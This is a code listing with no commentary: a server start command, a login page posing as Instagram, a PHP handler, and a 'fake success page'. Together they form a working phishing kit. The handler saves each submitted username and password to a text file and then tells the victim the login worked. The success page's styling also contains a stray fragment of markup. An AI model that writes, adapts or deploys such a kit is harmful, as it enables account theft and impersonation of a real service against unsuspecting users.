python3 -m http.server 8000
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #fafafa;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .login-container {
            background-color: #fff;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            width: 300px;
        }
        .login-container h1 {
            margin-bottom: 20px;
        }
        .login-container input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        .login-container button {
            width: 100%;
            padding: 10px;
            background-color: #0095f6;
            border: none;
            color: #fff;
            border-radius: 5px;
            cursor: pointer;
        }
        .login-container button:hover {
            background-color: #0078d7;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h1>Instagram</h1>
        <form action="login.php" method="post">
            <input type="text" name="username" placeholder="Phone number, username, or email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
    </div>
</body>
</html>
<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Save the credentials to a file or database
    file_put_contents('credentials.txt', $username . ":" . $password . "\n", FILE_APPEND);

    // Redirect to a fake success page
    header("Location: success.html");
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Successful</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #fafafa;```html
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .success-container {
            text-align: center;
            background-color: #fff;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }
    </style>
</head>
<body>
    <div class="success-container">
        <h1>Login Successful!</h1>
        <p>You have successfully logged in.</p>
    </div>
</body>
</html>
